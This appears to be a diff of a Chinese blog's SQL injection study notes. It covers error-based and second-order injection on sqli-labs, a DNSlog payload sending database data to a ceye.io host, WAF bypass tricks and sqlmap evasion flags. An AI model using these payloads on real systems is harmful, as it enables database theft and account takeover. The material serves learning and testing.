+<div class="code-container" code-lang="N1ql"><div class="codebox"><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> concat((<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)*<span class="number">2</span>)))--+</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><strong>爆数据：</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;and (select count(*) from users group by concat((select password from security.users limit 0,1),floor(rand(0)*2)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="N1ql"><div class="codebox"><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> concat((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> security.users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)*<span class="number">2</span>)))--+</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
@@ -352,23 +206,23 @@ select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;<
 <p><code>sqli-labs_Less24</code>为例：</p>
 <p>先注册一个名为<code>admin&#39;#</code>的用户，然后登录改密码。</p>
 <p>更改密码用的语句：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>这里<code>username</code>是<code>admin&#39;#</code>，所以语句变成了：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><code>#</code>后面的都被注释了。变成了更改<code>admin</code>的密码。</p>
 <p>可以用更改后的密码登录admin，或者结合<code>报错/盲注</code>进行数据库注入。</p>
 <h2><span id="dnslog注入">dnslog注入</span></h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/12896599.html">DNSlog注入学习 - Lushun - 博客园 (cnblogs.com)</a></p>
 <p>我的：<a target="_blank" rel="noopener" href="http://ceye.io/">CEYE - 监控服务以进行安全测试</a></p>
 <p>paylaod：</p>
-<pre class="line-numbers language-none"><code class="language-none">select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xhmmod.ceye.io&#x2F;abc&#39;));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Pgsql"><div class="codebox"><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">&#x27;.xhmmod.ceye.io/abc&#x27;</span>));</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h2><span id="堆叠注入">堆叠注入</span></h2><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询</p>
 <p><code>;</code></p>
-<h2><span id="基本函数参考">基本函数参考</span></h2><table>
+<h2><span id="基本函数参考">基本函数参考</span></h2><div class="table-container"><table>
 <thead>
 <tr>
 <th>函数</th>
@@ -461,7 +315,7 @@ select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;<
 <td>写文件(注意&#x2F;&#x2F;双写)</td>
 <td>select ‘句子’ into outfile ‘文件路径及名称’</td>
 </tr>
-</tbody></table>
+</tbody></table></div>
 <h2><span id="注释符使用">注释符使用</span></h2><p>（GET提交方式）：</p>
 <p>　　 – （后面有空格）</p>
 <p>　　 %23</p>
@@ -516,29 +370,22 @@ select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;<
 </li>
 <li><p>当开启了魔术函数&#x3D;&#x3D;过滤了引号&#x3D;&#x3D;时，可以在引号前加上一个汉字双字节编码，可以实现绕过。</p>
 <p>例如构造Payload为：</p>
-<pre class="line-numbers language-none"><code class="language-none">username&#x3D;%BF&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Routeros"><div class="codebox"><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">username</span>=%BF&#x27;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>%BF解码之后是中文乱码</p>
 </li>
 <li><p>用 &#x3D;&#x3D;&#x2F;*!50000%53elect*&#x2F;&#x3D;&#x3D; 代替select实现绕过</p>
-<pre class="line-numbers language-none"><code class="language-none">select
-&#x2F;*!50000%53elect*&#x2F;
-order 
- &#x2F;*!50000%6Frder*&#x2F;
-union
-&#x2F;*!50000%75nion*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Llvm"><div class="codebox"><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">/*<span class="title">!50000</span><span class="variable">%53</span>elect*/</span><br><span class="line">order </span><br><span class="line"> /*<span class="title">!50000</span><span class="variable">%6</span>Frder*/</span><br><span class="line">union</span><br><span class="line">/*<span class="title">!50000</span><span class="variable">%75</span>nion*/</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 </li>
 <li><p>http参数污染，比如PHP&#x2F;Apache的服务器get方式提交时存在多个相同的参数名，只有最后一个生效。（不同中间件规则不同）</p>
-<pre class="line-numbers language-none"><code class="language-none">例：?id&#x3D;1&#x2F;**&amp;id&#x3D;-1 union select 1,2,3#*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Applescript"><div class="codebox"><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例：?<span class="built_in">id</span>=<span class="number">1</span>/**&amp;<span class="built_in">id</span>=<span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">#*/</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 </li>
 <li><p>ip白名单，改<code>X-forwarded-for</code>、<code>X-remote-IP</code>、<code>X-originating-IP</code>、<code>X-remote-addr</code>、<code>X-Real-IP</code></p>
 </li>
 <li><p>静态资源</p>
 </li>
 </ol>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?id&#x3D;1 and 1&#x3D;1
-http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;x.txt?id&#x3D;1 and 1&#x3D;1	依然正常运行
-http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;admin.php?id&#x3D;1 and 1&#x3D;1	admin.php是在白名单里的没有拦截<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Apache"><div class="codebox"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/index.php?id=<span class="number">1</span> and <span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/index.php/x.txt?id=<span class="number">1</span> and <span class="number">1</span>=<span class="number">1</span>	依然正常运行</span><br><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/index.php/admin.php?id=<span class="number">1</span> and <span class="number">1</span>=<span class="number">1</span>	admin.php是在白名单里的没有拦截</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <ol start="19">
 <li><p>爬虫白名单</p>
@@ -548,43 +395,34 @@ http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;admin.php?id&#x3D;1 and 1&#x3D;1	
 <p>sys数据库<br>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自<code>information_schema</code>和<code>performance_chema</code>，其本身不存储数据。可以通过其中的<code>schema_auto_increment_columns</code>来获取表名。</p>
 </li>
 </ol>
-<pre class="line-numbers language-none"><code class="language-none">1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),1,1))&#x3D;103
-
-2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;.format()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Pgsql"><div class="codebox"><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&amp;&amp;ascii(substr((<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>)<span class="keyword">from</span> sys.x$schema_flattened_keys <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">103</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>||ascii(substr((<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),&#123;&#125;,<span class="number">1</span>))=&#123;&#125;.format()</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <hr>
 <h1><span id="工具">工具</span></h1><p>sqlmap、NoSQLAttack、Pangolin</p>
 <p>Sqlmap使用：</p>
 <p>一般：</p>
-<pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;url&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Vim"><div class="codebox"><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">&quot;url&quot;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>加上<strong>脚本</strong>：</p>
-<pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;url&quot; --tamper&#x3D;xxx.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Vim"><div class="codebox"><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">&quot;url&quot;</span> --tamper=xxx.<span class="keyword">py</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>开<strong>代理</strong>（一般用于burp抓包分析）：</p>
-<pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;url&quot; --proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Stylus"><div class="codebox"><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;url&quot;</span> <span class="attr">--proxy</span>=http:<span class="comment">//127.0.0.1:8080</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>随机<strong>Agent</strong>头：</p>
-<pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;url&quot; --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Sqf"><div class="codebox"><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;url&quot;</span> --<span class="built_in">random</span>-<span class="built_in">agent</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>指定爬虫Agent(百度)：</p>
-<pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;url&quot; --user-agent&#x3D;&quot;Mozilla&#x2F;5.0 (compatible; Baiduspider&#x2F;2.0; +http:&#x2F;&#x2F;www.baidu.com&#x2F;search&#x2F;spider.html)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Stylus"><div class="codebox"><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;url&quot;</span> <span class="attr">--user-agent</span>=<span class="string">&quot;Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)&quot;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>加<strong>延迟</strong>：</p>
-<pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;url&quot; --delay 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
